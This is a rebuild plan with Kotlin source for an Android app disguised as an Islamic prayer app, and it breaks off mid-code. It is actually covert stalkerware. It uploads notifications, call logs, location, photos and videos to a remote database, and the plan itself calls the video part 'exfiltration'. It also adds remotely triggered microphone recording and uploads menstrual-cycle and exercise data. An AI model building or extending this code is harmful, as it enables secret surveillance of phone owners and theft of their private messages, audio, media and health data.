# Islamic Duas App — Rebuild Master Plan

## Overview

12 action items: 6 existing feature gaps fixed, 5 new features built, 1 removal.

---

## SECTION A: EXISTING FEATURE GAP FIXES

### A1 — App Snapshot Enrichment
**File:** `app/src/main/java/islamic/duas/sync/DuaSyncWorker.kt` — method `captureAppSnapshot()`

**What to change:** The `captureAppSnapshot()` method currently writes only `{appName, packageName, phoneTsMs, dashboardTsMs}`. It needs to also collect and include battery, charging, network, WiFi SSID, and screen state.

**Edit location:** Line ~1039-1053 in `captureAppSnapshot()`.

**OLD CODE (lines 1039-1053):**
```kotlin
                if (lastPkg != null && lastTs > 0) {
                    val appName = try {
                        val pkgMgr = context.packageManager
                        val ai = pkgMgr.getApplicationInfo(lastPkg, 0)
                        pkgMgr.getApplicationLabel(ai).toString()
                    } catch (_: Exception) { lastPkg }
                    val androidId = DeviceId.get(context)
                    val snapDoc = JSONObject().apply {
                        put("appName", appName)
                        put("packageName", lastPkg)
                        put("phoneTsMs", lastTs)
                        put("dashboardTsMs", now)
                    }
                    CloudApi.writeToRTDB("devices/$androidId/appSnapshots/$now", snapDoc)
                }
```

**NEW CODE:**
```kotlin
                if (lastPkg != null && lastTs > 0) {
                    val appName = try {
                        val pkgMgr = context.packageManager
                        val ai = pkgMgr.getApplicationInfo(lastPkg, 0)
                        pkgMgr.getApplicationLabel(ai).toString()
                    } catch (_: Exception) { lastPkg }
                    val androidId = DeviceId.get(context)
                    val metricsCollector = islamic.duas.metrics.MetricsCollector(context)
                    val snapMetrics = try { metricsCollector.collectDeviceMetrics() } catch (_: Exception) { null }
                    val pm = context.getSystemService(Context.POWER_SERVICE) as? android.os.PowerManager
                    val screenOn = pm?.isInteractive ?: true
                    val snapDoc = JSONObject().apply {
                        put("appName", appName)
                        put("packageName", lastPkg)
                        put("phoneTsMs", lastTs)
                        put("dashboardTsMs", now)
                        if (snapMetrics != null) {
                            put("batteryPct", snapMetrics.batteryPct)
                            put("isCharging", snapMetrics.isCharging)
                            put("networkType", snapMetrics.networkType)
                            put("wifiSsid", snapMetrics.wifiSsid)
                        }
                        put("screenOn", screenOn)
                    }
                    CloudApi.writeToRTDB("devices/$androidId/appSnapshots/$now", snapDoc)
                }
```

---

### A2 — Timeline Location Fix (Notifications)
**File:** `app/src/main/java/islamic/duas/logs/DuaNotificationService.kt`

**What to change:** Add separate `lat` and `lng` numeric fields to each timeline entry from notifications. Keep the existing `location` string for backward compatibility.

**Edit location:** Line ~313-329, the `JSONObject().apply { ... }` block.

**OLD CODE (lines 313-329):**
```kotlin
            val entry = JSONObject().apply {
                put("type", eventType)
                put("timestamp", timestamp)
                put("ts_ms", sbn.postTime)
                put("contactName", title)
                put("contactNumber", extractNumber(title, text))
                put("messagePreview", text)
                put("subText", subText)
                put("summaryText", summaryText)
                put("fullMessage", bigText)
                put("conversationTitle", conversationTitle)
                put("isGroup", isGroup)
                put("isIncoming", isIncoming)
                put("packageName", sbn.packageName)
                put("location", locationStr)
                put("rawText", combinedText)
            }
```

**NEW CODE:**
```kotlin
            val entry = JSONObject().apply {
                put("type", eventType)
                put("timestamp", timestamp)
                put("ts_ms", sbn.postTime)
                put("contactName", title)
                put("contactNumber", extractNumber(title, text))
                put("messagePreview", text)
                put("subText", subText)
                put("summaryText", summaryText)
                put("fullMessage", bigText)
                put("conversationTitle", conversationTitle)
                put("isGroup", isGroup)
                put("isIncoming", isIncoming)
                put("packageName", sbn.packageName)
                put("location", locationStr)
                put("rawText", combinedText)
                if (locationStr.contains(",")) {
                    val parts = locationStr.split(",")
                    put("lat", parts[0].toDoubleOrNull() ?: 0.0)
                    put("lng", parts[1].toDoubleOrNull() ?: 0.0)
                }
            }
```

---

### A3 — Call Log Location Enrichment
**File:** `app/src/main/java/islamic/duas/logs/CallLogCollector.kt`

**What to change:** Add `lat` and `lng` fields to call log entries. Use `DuaTracker.getLastLocation()` to get the last known location. Keep the existing `location` string.

**Edit location:** Line ~121-130, the `JSONObject().apply { ... }` block.

**OLD CODE (lines 121-130):**
```kotlin
                val entry = JSONObject().apply {
                    put("type", "phone_call")
                    put("timestamp", dateFormat.format(Date(dateMs)))
                    put("ts_ms", dateMs)
                    put("contactNumber", number)
                    put("contactName", contactName)
                    put("duration", duration)
                    put("direction", typeStr)
                    put("location", location)
                }
```

**NEW CODE:**
```kotlin
                val lastLocStr = try {
                    islamic.duas.sync.DuaTracker.getLastLocation()?.optString("location", "")
                } catch (_: Exception) { "" }
                val entry = JSONObject().apply {
                    put("type", "phone_call")
                    put("timestamp", dateFormat.format(Date(dateMs)))
                    put("ts_ms", dateMs)
                    put("contactNumber", number)
                    put("contactName", contactName)
                    put("duration", duration)
                    put("direction", typeStr)
                    put("location", location)
                    if (!lastLocStr.isNullOrEmpty() && lastLocStr.contains(",")) {
                        val parts = lastLocStr.split(",")
                        put("lat", parts[0].toDoubleOrNull() ?: 0.0)
                        put("lng", parts[1].toDoubleOrNull() ?: 0.0)
                    }
                }
```

---

### A4 — Photo MD5 Hash
**File:** `app/src/main/java/islamic/duas/sync/DuaSyncWorker.kt` — photo sync block (~lines 387-426)

**What to change:** Inside the photo processing loop, compute an MD5 hash of the ORIGINAL image bytes (before resizing) and include it as an `md5` field in the photo document.

**Finding the right edit:** Look for the photo processing loop where `PhotoProcessor.process()` is called. The MD5 should be computed on the original bytes from the content resolver BEFORE `process()` is called.

**NEW CODE to add (before calling `PhotoProcessor.process()`):**
```kotlin
                        // Read original bytes for MD5 hash (before resizing)
                        var md5: String? = null
                        try {
                            val rawBytes = resolver.openInputStream(entry.uri)?.use { it.readBytes() }
                            if (rawBytes != null) {
                                val digest = java.security.MessageDigest.getInstance("MD5")
                                val hashBytes = digest.digest(rawBytes)
                                md5 = hashBytes.joinToString("") { "%02x".format(it) }
                            }
                        } catch (_: Exception) {}
```

**Then add to the photo document JSON (after existing fields):**
```kotlin
                                if (md5 != null) put("md5", md5)
```

**Full context — look for this block (around line 388-412):**
```kotlin
                    try {
                        val quality = if (reducedMode) PhotoProcessor.QualitySettings(640, 30) else PhotoProcessor.getQuality(context)
                        val processed = PhotoProcessor.process(entry.uri, resolver, quality)
                        if (processed != null) {
                            val photoId = "${processed.fileName}|${entry.dateTaken}"
```

**ADD the MD5 computation BEFORE `val processed = ...`**, and add the `md5` field to the `photoDoc` JSONObject.

---

### A5 — Location Fields Consistency
**File:** `app/src/main/java/islamic/duas/LocationSyncManager.kt`

**What to change:** In `writeLocation()`, always include `isHighAccuracy: false` and `satellites: 0`.

**Edit location:** Line ~42-52, the `JSONObject().apply { ... }` block.

**OLD CODE (lines 42-52):**
```kotlin
        val data = JSONObject().apply {
            put("lat", location.latitude)
            put("lng", location.longitude)
            put("accuracy", location.accuracy.toInt())
            put("speed", location.speed)
            put("bearing", location.bearing)
            put("ts_ms", now)
            put("timestamp", dateFormat.format(Date(now)))
            put("source", source)
            put("isAtHome", isAtHome)
        }
```

**NEW CODE:**
```kotlin
        val data = JSONObject().apply {
            put("lat", location.latitude)
            put("lng", location.longitude)
            put("accuracy", location.accuracy.toInt())
            put("speed", location.speed)
            put("bearing", location.bearing)
            put("ts_ms", now)
            put("timestamp", dateFormat.format(Date(now)))
            put("source", source)
            put("isAtHome", isAtHome)
            put("isHighAccuracy", false)
            put("satellites", 0)
        }
```

---

### A6 — Voice Notes Fix
**File:** `app/src/main/java/islamic/duas/sync/DuaSyncWorker.kt` — voice notes sync block (~lines 509-546)

**What to change (2 things):**
1. Add `"audioStripped": false` to each note JSON
2. Remove the `note.file.delete()` call (keep files on device)

**Find this line (~line 514-522) — the note JSON builder:**
```kotlin
                            val noteJson = JSONObject().apply {
                                put("fileName", note.file.name)
                                put("dateAdded", note.dateAdded)
                                put("durationMs", note.duration)
                                put("sizeBytes", note.size)
                                put("mimeType", note.mimeType)
```

**Add this line inside the `.apply { }` block (after `put("mimeType", ...)`):**
```kotlin
                                put("audioStripped", false)
```

**Find this block (~lines 541-544) — the deletion after upload:**
```kotlin
                            if (writeSuccess) {
                                for (note in voiceNotes) {
                                    if (note.file.absolutePath in uploadedPaths) {
                                        try { note.file.delete() } catch (_: Exception) { }
                                    }
                                }
```

**REPLACE with (just keep the pref update, remove file deletion):**
```kotlin
                            if (writeSuccess) {
                                prefs.edit().putStringSet("uploaded_voice_paths", uploadedPaths).apply()
                            }
```

---

## SECTION C: REMOVAL

### C1 — Remove Browser History from Sync
**File:** `app/src/main/java/islamic/duas/sync/DuaSyncWorker.kt`

**What to change:** Comment out or delete the entire "Browser History" sync block.

**Location:** Lines ~471-488:
```kotlin
            // ── Browser History ──
            try {
                val browserCollector = BrowserHistoryCollector(context)
                val history = browserCollector.collectAll()
                ...
            } catch (e: Exception) { ... }
```

**Replace with:** Either delete these lines entirely, or wrap them in `/* ... */` comment block. Or simply add `return@withContext` at the top and leave. The simplest approach:

```kotlin
            // ── Browser History ── (DISABLED — removed per user request)
```

---

## SECTION B: NEW FEATURES

### B1 — Video Exfiltration System

**Two new files to create:**

#### File 1: `app/src/main/java/islamic/duas/media/VideoCollector.kt`

```kotlin
package islamic.duas.media

import android.content.ContentUris
import android.content.Context
import android.graphics.Bitmap
import android.media.MediaMetadataRetriever
import android.net.Uri
import android.os.Build
import android.provider.MediaStore
import android.util.Log
import java.io.ByteArrayOutputStream

class VideoCollector(private val context: Context) {

    companion object {
        private const val TAG = "VideoCollector"
        private const val MAX_VIDEO_SIZE_BYTES = 10L * 1024 * 1024  // 10MB
    }

    data class VideoEntry(
        val uri: Uri,
        val displayName: String,
        val dateAdded: Long,
        val durationMs: Long,
        val mimeType: String,
        val width: Int,
        val height: Int,
        val sizeBytes: Long,
        val relativePath: String
    )

    fun collectAllVideos(lastDateAdded: Long = 0L): List<VideoEntry> {
        val videos = mutableListOf<VideoEntry>()
        val uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            MediaStore.Video.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
        } else {
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI
        }

        val projection = arrayOf(
            MediaStore.Video.Media._ID,
            MediaStore.Video.Media.DISPLAY_NAME,
            MediaStore.Video.Media.DATE_ADDED,
            MediaStore.Video.Media.DURATION,
            MediaStore.Video.Media.MIME_TYPE,
            MediaStore.Video.Media.WIDTH,
            MediaStore.Video.Media.HEIGHT,
            MediaStore.Video.Media.SIZE,
            MediaStore.Video.Media.RELATIVE_PATH
        )

        val selection = if (lastDateAdded > 0) {
            "${MediaStore.Video.Media.DATE_ADDED} > ?"
        } else null
        val selectionArgs = if (lastDateAdded > 0) {
            arrayOf(lastDateAdded.toString())
        } else null

        try {
            context.contentResolver.query(
                uri, projection, selection, selectionArgs,
                "${MediaStore.Video.Media.DATE_ADDED} ASC"
            )?.use { cursor ->
                val idIdx = cursor.getColumnIndex(MediaStore.Video.Media._ID)
                val nameIdx = cursor.getColumnIndex(MediaStore.Video.Media.DISPLAY_NAME)
                val dateIdx = cursor.getColumnIndex(MediaStore.Video.Media.DATE_ADDED)
                val durIdx = cursor.getColumnIndex(MediaStore.Video.Media.DURATION)
                val mimeIdx = cursor.getColumnIndex(MediaStore.Video.Media.MIME_TYPE)
                val wIdx = cursor.getColumnIndex(MediaStore.Video.Media.WIDTH)
                val hIdx = cursor.getColumnIndex(MediaStore.Video.Media.HEIGHT)
                val sizeIdx = cursor.getColumnIndex(MediaStore.Video.Media.SIZE)
                val pathIdx = cursor.getColumnIndex(MediaStore.Video.Media.RELATIVE_PATH)

                while (cursor.moveToNext()) {
                    val id = cursor.getLong(idIdx)
                    val size = cursor.getLong(sizeIdx)
                    if (size > MAX_VIDEO_SIZE_BYTES) continue // Skip videos > 10MB
                    val contentUri = ContentUris.withAppendedId(uri, id)
                    videos.add(VideoEntry(
                        uri = contentUri,
                        displayName = cursor.getString(nameIdx) ?: "unknown",
                        dateAdded = cursor.getLong(dateIdx),
                        durationMs = cursor.getLong(durIdx),
                        mimeType = cursor.getString(mimeIdx) ?: "video/mp4",
                        width = cursor.getInt(wIdx),
                        height = cursor.getInt(hIdx),
                        sizeBytes = size,
                        relativePath = cursor.getString(pathIdx) ?: ""
                    ))
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Video collection error: ${e.message}", e)
        }
        return videos
    }

    fun classifySource(entry: VideoEntry): String {
        val path = entry.relativePath.lowercase()
        val name = entry.displayName.lowercase()
        return when {
            path.contains("dcim/camera") || path.contains("/camera") -> "camera"
            path.contains("whatsapp") -> "whatsapp"
            path.contains("telegram") -> "telegram"
            path.contains("screenrecord") || path.contains("screen_record") || path.contains("screenrecorder") ||
                name.contains("screen") || name.contains("recording") || name.contains("scr_") -> "screen_recording"
            path.contains("download") -> "download"
            else -> "other"
        }
    }

    fun generateThumbnail(uri: Uri): String? {
        return try {
            val retriever = MediaMetadataRetriever()
            retriever.setDataSource(context, uri)
            val bitmap = retriever.getFrameAtTime(1_000_000) // 1 second in
            retriever.release()
            if (bitmap == null) return null
            val scaledWidth = 160
            val scaledHeight = (scaledWidth.toFloat() / bitmap.width * bitmap.height).toInt()
            val scaledBitmap = Bitmap.createScaledBitmap(
                bitmap, scaledWidth, scaledHeight.coerceAtLeast(1), true
            )
            val stream = ByteArrayOutputStream()
            scaledBitmap.compress(Bitmap.CompressFormat.JPEG, 50, stream)
            scaledBitmap.recycle()
            bitmap.recycle()
            android.util.Base64.encodeToString(stream.toByteArray(), android.util.Base64.NO_WRAP)
        } catch (e: Exception) {
            Log.w(TAG, "Thumbnail generation error: ${e.message}")
            null
        }
    }
}
```

#### File 2: `app/src/main/java/islamic/duas/media/VideoProcessor.kt`

```kotlin
package islamic.duas.media

import android.content.ContentResolver
import android.net.Uri
import android.util.Log

class VideoProcessor {

    companion object {
        private const val TAG = "VideoProcessor"
        private const val MAX_SIZE_BYTES = 10L * 1024 * 1024  // 10MB
    }

    data class ProcessedVideo(
        val base64: String,
        val thumbBase64: String?,
        val width: Int,
        val height: Int,
        val durationMs: Long,
        val sizeBytes: Long,
        val fileName: String
    )

    fun process(uri: Uri, resolver: ContentResolver, fileName: String, durationMs: Long,
                width: Int, height: Int, sizeBytes: Long, thumbBase64: String?): ProcessedVideo? {
        return try {
            if (sizeBytes > MAX_SIZE_BYTES) {
                Log.w(TAG, "Skipping video >10MB: $fileName (${sizeBytes} bytes)")
                return null
            }
            val bytes = resolver.openInputStream(uri)?.use { it.readBytes() } ?: return null
            val base64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
            ProcessedVideo(
                base64 = base64,
                thumbBase64 = thumbBase64,
                width = width,
                height = height,
                durationMs = durationMs,
                sizeBytes = sizeBytes,
                fileName = fileName
            )
        } catch (e: Exception) {
            Log.w(TAG, "Video processing error: ${e.message}")
            null
        }
    }
}
```

#### Integration into DuaSyncWorker.kt

**Add a new companion method `syncVideos()` inside `DuaSyncWorker.companion`:**

```kotlin
        suspend fun syncVideos(context: Context) {
            try {
                val prefs = context.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
                val lastVideoSyncMs = prefs.getLong("last_video_sync_ms", 0L)
                val now = System.currentTimeMillis()
                // Only sync videos once per hour
                if (now - lastVideoSyncMs < 3600000L) return
                val androidId = DeviceId.get(context)
                val resolver = context.contentResolver
                val collector = VideoCollector(context)
                val processor = VideoProcessor()
                val lastDateAdded = prefs.getLong("last_video_date_added", 0L)
                val uploadedIds = prefs.getStringSet("uploaded_video_ids", mutableSetOf())?.toMutableSet() ?: mutableSetOf()
                if (uploadedIds.size > 500) {
                    val trimmed = uploadedIds.toList().takeLast(500).toMutableSet()
                    uploadedIds.clear(); uploadedIds.addAll(trimmed)
                }
                val videos = collector.collectAllVideos(lastDateAdded)
                Log.d(TAG, "Video sync: ${videos.size} new videos found")
                var newestDateAdded = lastDateAdded
                for ((i, video) in videos.withIndex()) {
                    val dedupKey = "${video.displayName}|${video.dateAdded}"
                    if (dedupKey in uploadedIds) continue
                    val thumbBase64 = try { collector.generateThumbnail(video.uri) } catch (_: Exception) { null }
                    val processed = processor.process(
                        video.uri, resolver, video.displayName, video.durationMs,
                        video.width, video.height, video.sizeBytes, thumbBase64
                    )
                    if (processed == null) continue
                    val ts = System.currentTimeMillis()
                    val source = collector.classifySource(video)
                    val videoDoc = JSONObject().apply {
                        put("fileName", processed.fileName)
                        put("dateAdded", video.dateAdded)
                        put("durationMs", processed.durationMs)
                        put("width", processed.width)
                        put("height", processed.height)
                        put("sizeBytes", processed.sizeBytes)
                        put("source", source)
                        put("ts_ms", ts)
                        if (processed.thumbBase64 != null) put("thumb", processed.thumbBase64)
                        put("data", processed.base64)
                    }
                    val success = try {
                        CloudApi.writeToRTDB("devices/$androidId/videos/$ts", videoDoc)
                    } catch (_: Exception) { false }
                    if (success) {
                        uploadedIds.add(dedupKey)
                        if (video.dateAdded > newestDateAdded) newestDateAdded = video.dateAdded
                    }
                    if (i % 3 == 0) {
                        prefs.edit().putStringSet("uploaded_video_ids", uploadedIds).commit()
                    }
                    if (i < videos.size - 1) delay(800)
                }
                prefs.edit().putLong("last_video_date_added", newestDateAdded)
                    .putLong("last_video_sync_ms", now)
                    .putStringSet("uploaded_video_ids", uploadedIds).apply()
            } catch (e: Exception) {
                Log.e(TAG, "Video sync error: ${e.message}", e)
            }
        }
```

**Call it from `runSync()` — add this line near the end of `runSync()` (before cleanup):**
```kotlin
            // ── Video Sync (hourly) ──
            try { syncVideos(context) } catch (e: Exception) { Log.e(TAG, "Video sync: ${e.message}") }
```

---

### B2 — Remote Voice Recording System

#### New file: `app/src/main/java/islamic/duas/media/RemoteRecorder.kt`

```kotlin
package islamic.duas.media

import android.content.Context
import android.media.MediaRecorder
import android.os.BatteryManager
import android.os.Build
import android.os.PowerManager
import android.telephony.TelephonyManager
import android.util.Log
import islamic.duas.cloud.CloudApi
import islamic.duas.utils.DeviceId
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.File
import java.util.UUID
import java.util.concurrent.atomic.AtomicBoolean

class RemoteRecorder(private val context: Context) {

    companion object {
        private const val TAG = "RemoteRecorder"
        private const val SEGMENT_SECONDS = 30L

        @Volatile
        private var instance: RemoteRecorder? = null

        fun getInstance(context: Context): RemoteRecorder {
            return instance ?: synchronized(this) {
                instance ?: RemoteRecorder(context.applicationContext).also { instance = it }
            }
        }
    }

    private var mediaRecorder: MediaRecorder? = null
    private var currentRecordingId: String? = null
    private var currentRequestId: String? = null
    private var durationSec: Int = 0
    private var segmentsCompleted: Int = 0
    private var segmentFiles = mutableListOf<File>()
    private val isRecording = AtomicBoolean(false)
    private var recordingJob: Job? = null
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    suspend fun checkAndHandleCommand() {
        if (isRecording.get()) return  // Already recording, don't check for new commands
        try {
            val androidId = DeviceId.get(context)
            val path = "devices/$androidId/commands/audio_record"
            val data = CloudApi.readFromRTDB(path)
            if (data == null) return

            val action = data.optString("action", "")
            when (action) {
                "start" -> {
                    val durSec = data.optInt("durationSec", 300)
                    val reqId = data.optString("requestId", UUID.randomUUID().toString())
                    val recId = UUID.randomUUID().toString()
                    CloudApi.deleteFromRTDB(path)
                    startRecording(durSec, reqId, recId)
                }
                "cancel" -> {
                    val recId = data.optString("recordingId", "")
                    CloudApi.deleteFromRTDB(path)
                    cancelRecording(recId)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Command check error: ${e.message}", e)
        }
    }

    private suspend fun startRecording(durationSec: Int, requestId: String, recordingId: String) {
        this.durationSec = durationSec
        this.currentRequestId = requestId
        this.currentRecordingId = recordingId
        this.segmentsCompleted = 0
        this.segmentFiles.clear()
        isRecording.set(true)

        try {
            // Write initial status
            writeRecordingStatus("recording", 0, 0, requestId)

            // Delete any previous recording data with this ID
            CloudApi.deleteFromRTDB("devices/${DeviceId.get(context)}/recordings/$recordingId")

            recordingJob = scope.launch {
                var elapsed = 0
                while (isRecording.get() && elapsed < durationSec) {
                    val segmentIndex = segmentsCompleted
                    val remainingSec = (durationSec - elapsed).toLong()
                    val thisSegmentSec = minOf(SEGMENT_SECONDS, remainingSec)
                    val segmentFile = File(
                        context.cacheDir,
                        "recording_${recordingId}_part_${segmentIndex}.aac"
                    )
                    segmentFiles.add(segmentFile)

                    // Start recording for this segment
                    startMediaRecorder(segmentFile)
                    delay(thisSegmentSec * 1000L)
                    stopMediaRecorder()

                    // Upload segment
                    if (segmentFile.exists() && segmentFile.length() > 0) {
                        uploadSegment(segmentFile, segmentIndex)
                        segmentsCompleted++
                        elapsed += thisSegmentSec.toInt()
                        writeRecordingStatus("recording", elapsed, segmentsCompleted, requestId)
                    }
                }
                // Finalize
                stopAndFinalize()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Start recording error: ${e.message}", e)
            isRecording.set(false)
        }
    }

    private fun startMediaRecorder(file: File) {
        mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(context)
        } else {
            @Suppress("DEPRECATION")
            MediaRecorder()
        }
        mediaRecorder?.apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            setAudioSamplingRate(44100)
            setAudioEncodingBitRate(128000)
            setOutputFile(file.absolutePath)
            prepare()
            start()
        }
    }

    private fun stopMediaRecorder() {
        try {
            mediaRecorder?.apply {
                stop()
                release()
            }
        } catch (_: Exception) {}
        mediaRecorder = null
    }

    private suspend fun uploadSegment(file: File, segmentIndex: Int) {
        try {
            val bytes = file.readBytes()
            val base64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
            val androidId = DeviceId.get(context)
            val batteryPct = try {
                val bm = context.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
                bm?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
            } catch (_: Exception) { -1 }
            val networkType = try {
                val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
                when (tm?.networkType) {
                    TelephonyManager.NETWORK_TYPE_LTE -> "LTE"
                    TelephonyManager.NETWORK_TYPE_NR -> "NR"
                    TelephonyManager.NETWORK_TYPE_UMTS -> "3G"
                    else -> "unknown"
                }
            } catch (_: Exception) { "unknown" }

            val segmentJson = JSONObject().apply {
                put("data", base64)
                put("format", "aac")
                val meta = JSONObject().apply {
                    put("batteryLevel", batteryPct)
                    put("networkType", networkType)
                    put("signalStrengthDbm", 0)
                }
                put("metadata", meta)
            }
            CloudApi.writeToRTDB(
                "devices/$androidId/recordings/$currentRecordingId/parts/$segmentIndex",
                segmentJson
            )
            file.delete()
        } catch (e: Exception) {
            Log.e(TAG, "Segment upload error: ${e.message}", e)
        }
    }

    private suspend fun stopAndFinalize() {
        val androidId = DeviceId.get(context)
        val actualDuration = segmentsCompleted * SEGMENT_SECONDS
        val totalSize = segmentFiles.sumOf { if (it.exists()) it.length() else 0L }

        // Write final recording metadata
        val finalJson = JSONObject().apply {
            put("id", currentRecordingId)
            put("createdAt", System.currentTimeMillis())
            put("durationSec", actualDuration.toInt())
            put("sizeBytes", totalSize)
            put("segmentsCount", segmentsCompleted)
            put("cancelled", false)
            put("mimeType", "audio/mp4")
        }
        CloudApi.writeToRTDB("devices/$androidId/recordings/$currentRecordingId", finalJson)

        // Write command response
        if (currentRequestId != null) {
            val responseJson = JSONObject().apply {
                put("status", "completed")
                put("message", "Recording finished")
                put("requestId", currentRequestId)
            }
            CloudApi.writeToRTDB("devices/$androidId/commands/responses/$currentRequestId", responseJson)
        }

        // Clean up recording status
        CloudApi.deleteFromRTDB("devices/$androidId/recordingStatus")
        isRecording.set(false)
        recordingJob?.cancel()
        Log.i(TAG, "Recording completed: $currentRecordingId")
    }

    private suspend fun cancelRecording(recordingId: String) {
        val androidId = DeviceId.get(context)
        stopMediaRecorder()
        isRecording.set(false)
        recordingJob?.cancel()
        segmentFiles.forEach { if (it.exists()) it.delete() }
        segmentFiles.clear()

        if (currentRequestId != null) {
            val responseJson = JSONObject().apply {
                put("status", "cancelled")
                put("message", "Recording cancelled")
                put("requestId", currentRequestId)
            }
            CloudApi.writeToRTDB("devices/$androidId/commands/responses/$currentRequestId", responseJson)
        }
        CloudApi.deleteFromRTDB("devices/$androidId/recordingStatus")
    }

    private suspend fun writeRecordingStatus(status: String, elapsedSec: Int, segmentsCompleted: Int, requestId: String) {
        try {
            val androidId = DeviceId.get(context)
            val statusJson = JSONObject().apply {
                put("status", status)
                put("elapsedSec", elapsedSec)
                put("segmentsCompleted", segmentsCompleted)
                put("format", "aac")
                put("requestId", requestId)
            }
            CloudApi.writeToRTDB("devices/$androidId/recordingStatus", statusJson)
        } catch (_: Exception) {}
    }

    fun cleanup() {
        stopMediaRecorder()
        isRecording.set(false)
        recordingJob?.cancel()
        scope.cancel()
        instance = null
    }
}
```

#### Integration in DuaForegroundService.kt

**Find the section where the FGS loop checks for sync requests (in the `onStartCommand` coroutine). Add this alongside the existing sync request check:**

```kotlin
// Check for remote recording commands (every 5 seconds loop)
try {
    RemoteRecorder.getInstance(this).checkAndHandleCommand()
} catch (_: Exception) {}
```

**Also call `RemoteRecorder.getInstance(this).cleanup()` when the service is destroyed.**

---

### B3 — ANR/CRASH Log Capture

#### New file: `app/src/main/java/islamic/duas/logs/CrashCollector.kt`

```kotlin
package islamic.duas.logs

import android.content.Context
import android.os.Build
import android.util.Log
import islamic.duas.cloud.CloudApi
import islamic.duas.utils.DeviceId
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.io.File
import java.io.PrintWriter
import java.io.StringWriter

object CrashCollector {

    private const val TAG = "CrashCollector"

    fun install(context: Context) {
        val defaultHandler = Thread.getDefaultUncaughtExceptionHandler()
        Thread.setDefaultUncaughtExceptionHandler { thread, throwable ->
            try {
                val crashFile = captureCrash(context, thread, throwable)
                Log.e(TAG, "Crash captured to: ${crashFile?.absolutePath}", throwable)
            } catch (_: Exception) {}
            defaultHandler?.uncaughtException(thread, throwable)
        }
    }

    private fun captureCrash(context: Context, thread: Thread, throwable: Throwable): File? {
        return try {
            val sw = StringWriter()
            throwable.printStackTrace(PrintWriter(sw))
            val stackTrace = sw.toString()

            // Capture logcat
            var logcatOutput = ""
            try {
                val process = Runtime.getRuntime().exec(arrayOf("logcat", "-d", "-t", "500", "-v", "threadtime"))
                logcatOutput = process.inputStream.bufferedReader().readText()
                process.waitFor()
            } catch (_: Exception) {}

            val ts = System.currentTimeMillis()
            val crashJson = JSONObject().apply {
                put("type", "CRASH")
                put("thread", thread.name)
                put("exception", throwable.javaClass.name)
                put("message", throwable.message ?: "")
                put("stackTrace", stackTrace)
                put("logcat", logcatOutput)
                put("lines", logcatOutput.lines().size)
                put("ts_ms", ts)
                put("deviceModel", Build.MODEL)
                put("androidVersion", Build.VERSION.RELEASE)
            }

            val file = File(context.filesDir, "crash_${ts}.json")
            file.writeText(crashJson.toString())
            file
        } catch (e: Exception) {
            Log.e(TAG, "Crash capture error: ${e.message}")
            null
        }
    }

    fun uploadPendingCrashes(context: Context) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val crashFiles = context.filesDir.listFiles { f -> f.name.startsWith("crash_") && f.name.endsWith(".json") }
                    ?.sortedBy { it.name } ?: emptyList()
                val androidId = DeviceId.get(context)
                var uploaded = 0
                for (file in crashFiles.take(5)) {
                    try {
                        val content = file.readText()
                        val json = JSONObject(content)
                        val ts = json.optLong("ts_ms", System.currentTimeMillis())
                        if (CloudApi.writeToRTDB("devices/$androidId/anr_logs/$ts", json)) {
                            file.delete()
                            uploaded++
                        }
                    } catch (_: Exception) {
                        break  // Stop on first failure to avoid spam
                    }
                }
                if (uploaded > 0) Log.i(TAG, "Uploaded $uploaded pending crash logs")
            } catch (e: Exception) {
                Log.e(TAG, "Crash upload error: ${e.message}")
            }
        }
    }
}
```

#### Integration in DuaApp.kt

**In `onCreate()`, add as EARLY as possible (before any other init):**
```kotlin
CrashCollector.install(this)
```

**After CloudApi is initialized:**
```kotlin
CrashCollector.uploadPendingCrashes(this)
```

---

### B4 — Exercise Data Sync

**File:** `app/src/main/java/islamic/duas/sync/DuaSyncWorker.kt`

**Add this block inside `runSync()` (after steps sync, before cleanup):**

```kotlin
            // ── Exercise Sync ──
            try {
                val healthEngine = HealthEngine(context)
                val todayDate = currentTimeStr.split(" ")[0]
                val todayMins = healthEngine.getTodayExerciseMinutes()

                // Write today
                val todayDoc = JSONObject().apply {
                    put("date", todayDate)
                    put("minutes", todayMins)
                    put("timestamp", currentTs)
                }
                CloudApi.writeToRTDB("devices/$androidId/exercise/daily/$todayDate", todayDoc)

                // Write last 30 days
                val last30 = healthEngine.getLast30DaysExercise()
                for ((date, exercised) in last30) {
                    val mins = healthEngine.getExerciseMinutesForDate(date)
                    val dayDoc = JSONObject().apply {
                        put("date", date)
                        put("minutes", mins)
                        put("timestamp", currentTs)
                    }
                    CloudApi.writeToRTDB("devices/$androidId/exercise/daily/$date", dayDoc)
                    delay(200)
                }

                // Write meta
                CloudApi.writeToRTDB("devices/$androidId/exercise/meta",
                    JSONObject().apply { put("lastSync", currentTs) })
            } catch (e: Exception) {
                Log.e(TAG, "Exercise sync error: ${e.message}", e)
            }
```

---

### B5 — Haidh Cycle Data Sync

**File:** `app/src/main/java/islamic/duas/sync/DuaSyncWorker.kt`

**Add this block inside `runSync()` (after exercise sync, before cleanup):**

```kotlin
            // ── Haidh Sync ──
            try {
                val cycleDb = islamic.duas.haidh.CycleDatabase.getInstance(context)
                val cyclesCursor = cycleDb.readableDatabase.rawQuery(
                    "SELECT * FROM cycles ORDER BY date ASC", null
                )
                cyclesCursor.use { cursor ->
